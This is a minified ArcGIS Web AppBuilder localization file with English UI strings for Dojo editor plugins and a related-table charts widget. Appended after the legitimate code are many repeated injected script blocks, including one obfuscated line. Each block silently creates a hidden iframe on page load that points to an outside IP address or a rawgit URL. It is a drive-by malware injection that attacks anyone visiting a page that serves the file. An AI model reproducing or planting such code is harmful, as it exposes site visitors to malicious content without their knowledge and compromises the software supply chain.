// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"dijit/_editor/nls/commands":{bold:"Bold",copy:"Copy",cut:"Cut","delete":"Delete",indent:"Indent",insertHorizontalRule:"Horizontal Rule",insertOrderedList:"Numbered List",insertUnorderedList:"Bullet List",italic:"Italic",justifyCenter:"Align Center",justifyFull:"Justify",justifyLeft:"Align Left",justifyRight:"Align Right",outdent:"Outdent",paste:"Paste",redo:"Redo",removeFormat:"Remove Format",selectAll:"Select All",strikethrough:"Strikethrough",subscript:"Subscript",superscript:"Superscript",
underline:"Underline",undo:"Undo",unlink:"Remove Link",createLink:"Create Link",toggleDir:"Toggle Direction",insertImage:"Insert Image",insertTable:"Insert/Edit Table",toggleTableBorder:"Toggle Table Border",deleteTable:"Delete Table",tableProp:"Table Property",htmlToggle:"HTML Source",foreColor:"Foreground Color",hiliteColor:"Background Color",plainFormatBlock:"Paragraph Style",formatBlock:"Paragraph Style",fontSize:"Font Size",fontName:"Font Name",tabIndent:"Tab Indent",fullScreen:"Toggle Full Screen",
viewSource:"View HTML Source",print:"Print",newPage:"New Page",systemShortcut:'The "${0}" action is only available in your browser using a keyboard shortcut. Use ${1}.',ctrlKey:"ctrl+${0}",appleKey:"\u2318${0}",_localized:{}},"dijit/_editor/nls/FontChoice":{fontSize:"Size",fontName:"Font",formatBlock:"Format",serif:"serif","sans-serif":"sans-serif",monospace:"monospace",cursive:"cursive",fantasy:"fantasy",noFormat:"None",p:"Paragraph",h1:"Heading",h2:"Subheading",h3:"Sub-subheading",pre:"Pre-formatted",
1:"xx-small",2:"x-small",3:"small",4:"medium",5:"large",6:"x-large",7:"xx-large",_localized:{}},"dojox/editor/plugins/nls/Preview":{preview:"Preview",_localized:{}},"dojox/editor/plugins/nls/FindReplace":{findLabel:"Find:",findTooltip:"Enter text to find",replaceLabel:"Replace with:",replaceTooltip:"Enter text to replace with",findReplace:"Find and Replace",matchCase:"Match case",matchCaseTooltip:"Match case",backwards:"Backwards",backwardsTooltip:"Search backwards for text",replaceAllButton:"Replace All",
replaceAllButtonTooltip:"Replace all the text",findButton:"Find",findButtonTooltip:"Find the text",replaceButton:"Replace",replaceButtonTooltip:"Replace the text",replaceDialogText:"Replaced ${0} occurrences.",eofDialogText:"Last occurrence ${0}",eofDialogTextFind:"found",eofDialogTextReplace:"replaced",_localized:{}},"dojox/editor/plugins/nls/PasteFromWord":{pasteFromWord:"Paste From Word",instructions:"Paste the content from Word into the text box below.  Once you are satisfied with the content to insert, press the paste button.  To abort inserting text, press the cancel button.",
_localized:{}},"dojox/editor/plugins/nls/InsertAnchor":{insertAnchor:"Insert Anchor",title:"Anchor Properties",anchor:"Name:",text:"Description:",set:"Set",cancel:"Cancel",_localized:{}},"dojox/editor/plugins/nls/Blockquote":{blockquote:"Blockquote",_localized:{}},"widgets/RelatedTableCharts/setting/nls/strings":{chartSettingLabel:"Chart settings",addNewLabel:"Add new",generalSettingLabel:"General settings",layerChooser:{title:"Select layer to chart",selectPolygonLayerLabel:"Select layer",selectPolygonLayerHintText:"Hint: If configuring multiple charts, then layers have to be of the same geometry type",
selectRelatedTableLayerLabel:"Select table related to layer",selectRelatedTableLayerHintText:"Hint: Only tables with numeric fields are displayed",errorInSelectingPolygonLayer:"Please select a layer which has a related point layer.",errorInSelectingRelatedLayer:"Please select a valid related table/layer to  layer.",polygonLayerNotHavingRelationships:"Selected layer don't have any related table/layer."},ChartSetting:{sectionTitle:"Section title",sectionTitleHintText:"Hint: Displayed in section header title",
chartTitle:"Chart title",chartTitleHintText:"Hint: Displayed centered on top of chart",chartDescription:"Description",chartDescriptionHintText:"Hint: Displayed below chart",chartType:"Chart type",barChart:"Bar chart",pieChart:"Pie chart",polarChart:"Polar chart",dataSeriesField:"Data series field",labelField:"Label field",chartColor:"Chart color",singleColor:"Single color",colorByTheme:"Color by theme",colorByFieldValue:"Color by field value",xAxisTitle:"X-axis title",xAxisHintText:"Hint: X-axis title",
yAxisTitle:"Y-axis title",yAxisHintText:"Hint: Y-axis title",fieldColorLabel:"Label",fieldColorColor:"Color",defaultFieldSelectLabel:"Select",errMsgFieldValuesNotFound:"Unable to find values for the selected field",errMsgSectionTitle:"Please enter the section title",errMsgFieldByValue:"Please select field value",settingTabTitle:"Setting",layoutTabTitle:"Layout",polarChartSelectFieldsHintText:"Hint: Select fields to generate polar chart",visibilityText:"Visibility",fieldNameText:"Field Name",aliasNameText:"Alias",
errMsgPolarFieldsRequired:"Please select three or more fields to generate polar chart",polarChartPolygonFillLabel:"Fill polygon",polarChartPolygonFillHintText:"Hint: Select checkbox to show polygon fill in polar graph",ThemeSelector:{themeAdobebricks:"Adobebricks",themeAlgae:"Algae",themeBahamation:"Bahamation",themeBlueDusk:"BlueDusk",themeCubanShirts:"CubanShirts",themeDesert:"Desert",themeDistinctive:"Distinctive",themeDollar:"Dollar",themeGrasshopper:"Grasshopper",themeGrasslands:"Grasslands",
themeGreySkies:"GreySkies",themeHarmony:"Harmony",themeIndigoNation:"IndigoNation",themeIreland:"Ireland",themeMiamiNice:"MiamiNice",themeMinty:"Minty",themePurpleRain:"PurpleRain",themeRoyalPurples:"RoyalPurples",themeSageToLime:"SageToLime",themeTufte:"Tufte",themeWatersEdge:"WatersEdge",themeWetlandText:"Wetland",themePlotKitblue:"PlotKit.blue",themePlotKitcyan:"PlotKit.cyan",themePlotKitgreen:"PlotKit.green",themePlotKitorange:"PlotKit.orange",themePlotKitpurple:"PlotKit.purple",themePlotKitred:"PlotKit.red"}},
GeneralSetting:{legendGeneralSettingText:"General Settings",locationSymbolLabel:"Graphic location symbol",locationSymbolHintText:"Hint: Used to display symbol for address and click location",refreshIntervalLabel:"Refresh interval",refreshIntervalHintText:"Hint: Used to refresh charts based on this interval. Specify a value between 1 to 1440 minutes",errMsgRefreshInterval:"Please specify the refresh interval between 0 to 1440 minutes",symbolPickerPreviewText:"Preview:"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});